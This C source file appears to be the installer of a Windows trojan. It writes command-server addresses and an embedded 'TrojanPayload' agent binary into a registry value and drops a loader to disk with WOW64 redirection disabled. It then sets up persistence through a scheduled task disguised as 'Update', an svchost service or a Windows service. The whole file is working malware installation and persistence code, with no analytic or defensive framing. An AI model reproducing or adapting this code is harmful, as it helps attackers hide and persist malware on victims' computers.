#include "install.h"
#include <log.h>
#include "resource.h"
#include "scheduler.h"
#include "systeminfo.h"

#ifdef SERVICE
#include "service.h"
#endif // SERVICE

#ifdef SVCHOST
#include "svchost.h"
#endif // SVCHOST


PBYTE MapResource(PTSTR resourceType, INT resourceId, PDWORD size)
{
	HGLOBAL hResL;
	HRSRC hRes;

	hRes = FindResource(NULL, MAKEINTRESOURCE(resourceId), resourceType);
	hResL = LoadResource(NULL, hRes);

	if (size != NULL)
		*size = SizeofResource(NULL, hRes);

	return (BYTE *)LockResource(hResL);
}

LONG WriteRegistryValue(PTSTR pszPath, DWORD dwType, PTSTR pszValue, PVOID pData, DWORD cbData)
{
	HKEY	hKey;
	LONG	lResult;
	HKEY	hRootKey = HKEY_LOCAL_MACHINE;

start:

	lResult = RegOpenKeyEx(hRootKey, pszPath, 0, KEY_WRITE, &hKey);
	if (lResult == ERROR_FILE_NOT_FOUND)
	{
		lResult = RegCreateKeyEx(hRootKey, pszPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	}
	
	if (lResult == ERROR_ACCESS_DENIED)
	{
		hRootKey = HKEY_CURRENT_USER;

		goto start;
	}
	else if (lResult != ERROR_SUCCESS)
	{
		return lResult;
	}

	

	if (lResult == ERROR_SUCCESS)
	{
		lResult = RegSetValueEx(hKey, pszValue, 0, dwType, (LPCBYTE)pData, cbData);

		RegCloseKey(hKey);
	}

	return lResult;
}

BOOL WriteConfig()
{
	TCHAR	szSubKey[MAX_PATH];
	TCHAR	szParam[MAX_PATH];
	INT		szParamLength;
	LONG	lResult;

	if (!LoadString(NULL, IDS_CFG_PATH, szSubKey, ARRAYSIZE(szSubKey)))
	{
		LogTrace(_T("Error get cfg path\r\n"));

		return FALSE;
	}

	szParamLength = LoadString(NULL, IDS_NAME, szParam, ARRAYSIZE(szParam));
	if (szParamLength)
	{
		lResult = WriteRegistryValue(szSubKey, REG_SZ, _T("Name"), szParam, szParamLength * sizeof(TCHAR));
		if (lResult != ERROR_SUCCESS)
		{
			LogTrace(_T("Error write to reg %d\r\n"), lResult);

			return FALSE;
		}
	}
	else
	{
		LogTrace(_T("Error get name string\r\n"));
	}

	szParamLength = LoadString(NULL, IDS_TIMEOUT, szParam, ARRAYSIZE(szParam));
	if (szParamLength)
	{
		lResult = WriteRegistryValue(szSubKey, REG_SZ, _T("Timeout"), szParam, szParamLength * sizeof(TCHAR));
		if (lResult != ERROR_SUCCESS)
		{
			LogTrace(_T("Error write to reg %d\r\n"), lResult);

			return FALSE;
		}
	}
	else
	{
		LogTrace(_T("Error get timeout string\r\n"));
	}

	TCHAR szServers[MAX_PATH];
	INT	dwServersLength = LoadString(NULL, IDS_SERVERS, szServers, ARRAYSIZE(szServers));
	if (dwServersLength)
	{
		szServers[dwServersLength + 1] = 0x00;
		for (INT i = 0; i < dwServersLength; i++)
		{
			if (szServers[i] == _T(';'))
			{
				szServers[i] = 0x00;
			}
		}

		lResult = WriteRegistryValue(szSubKey, REG_MULTI_SZ, _T("Servers"), szServers, dwServersLength * sizeof(TCHAR));
		if (lResult != ERROR_SUCCESS)
		{
			LogTrace(_T("Error write to reg %d\r\n"), lResult);

			return FALSE;
		}
	}
	else
	{
		LogTrace(_T("Error get servers string\r\n"));
	}

	PBYTE	pTrojanPayload = NULL;
	DWORD	dwTrojanSize;

	pTrojanPayload = MapResource(_T("BIN"), IDR_AGENT, &dwTrojanSize);
	if (pTrojanPayload)
	{
		lResult = WriteRegistryValue(szSubKey, REG_BINARY, _T("Main"), pTrojanPayload, dwTrojanSize);
		if (lResult != ERROR_SUCCESS)
		{
			LogTrace(_T("Error write to reg %d\r\n"), lResult);

			return FALSE;
		}
	}
	else
	{
		LogTrace(_T("Error get agent body\r\n"));

		return FALSE;
	}

	return TRUE;
}

BOOL Dump(LPCTSTR pszInstallPath)
{
	BOOL bRet = FALSE;
	HANDLE	hFile = INVALID_HANDLE_VALUE;
	PVOID OldValue = NULL;

	if (Wow64DisableWow64FsRedirection(&OldValue))
	{

		hFile = CreateFile(pszInstallPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		
		if (FALSE == Wow64RevertWow64FsRedirection(OldValue))
		{
			return FALSE;
		}

		
		if (hFile == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}
	}

	

	PBYTE	pbData;
	DWORD	dwDataSize;

	pbData = MapResource(RT_RCDATA, IsWow64() ? IDR_LOADER_64 : IDR_LOADER_86, &dwDataSize);
	if (pbData)
	{
		DWORD	dwWritten;

		if (WriteFile(hFile, pbData, dwDataSize, &dwWritten, NULL) && (dwDataSize == dwWritten))
		{
			CloseHandle(hFile);

			bRet = TRUE;
		}
		else
		{
			CloseHandle(hFile);

			DeleteFile(pszInstallPath);
		}
	}

	return bRet;
}

BOOL InstallScheduler(LPCTSTR pszInstallPath)
{
	HRESULT hr = CoInitialize(NULL);
		
	if (FAILED(hr))
	{
		return FALSE;
	}

	hr = RegisterTask(_T("Update"), pszInstallPath);
	if (SUCCEEDED(hr))
	{
		LogTrace(_T("Success write to startup\r\n"));
	}
	else
	{
		LogTrace(_T("Error write to startup 0x%.8X\r\n"), hr);

		return FALSE;
	}

	CoUninitialize();

	return TRUE;
}


#ifdef SERVICE
BOOL InstallService(LPCTSTR pszInstallPath)
{
	BOOL	bRet = FALSE;

	bRet = DoInstallSvc(pszInstallPath);
	if (bRet)
	{
		bRet = DoStartSvc();
	}

	return bRet;
}
#endif // SERVICE



BOOL Install(LPCTSTR pszInstallPath)
{
	LogTrace(_T("\r\nInstall processed\r\n\r\n"));

#pragma region Step 1

	LogTrace(_T("Step 1. Write config\r\n"));

	if (WriteConfig())
	{
		LogTrace(_T("Success write config\r\n"));
	}
	else
	{
		LogTrace(_T("Error write config\r\n"));

		return FALSE;
	}
#pragma endregion

#pragma region Step 2

	LogTrace(_T("Step 2. Dump loader\r\n"));

	if (!Dump(pszInstallPath))
	{
		LogTrace(_T("Error dump loader\r\n"));

		return FALSE;
	}
	else
	{
		LogTrace(_T("Success dump loader\r\n"));
	}

#pragma endregion

#pragma region Step 3

	LogTrace(_T("Step 3. Write to startup\r\n"));


#ifdef SCHEDULER
	if (!InstallScheduler(pszInstallPath))
	{
		LogTrace(_T("Error create task\r\n"));

		return FALSE;
	}
#endif // SCHEDULER

#ifdef SVCHOST
	if (InstallSvchost((LPTSTR)pszInstallPath) != 0)
	{
		LogTrace(_T("Error create svchost service\r\n"));

		return FALSE;
	}
#endif // SVCHOST

#ifdef SERVICE
	if (!InstallService(pszInstallPath))
	{
		LogTrace(_T("Error create service\r\n"));

		return FALSE;
	}
#endif // SERVICE


#pragma endregion

	LogTrace(_T("Finish install\r\n"));

	return TRUE;
}

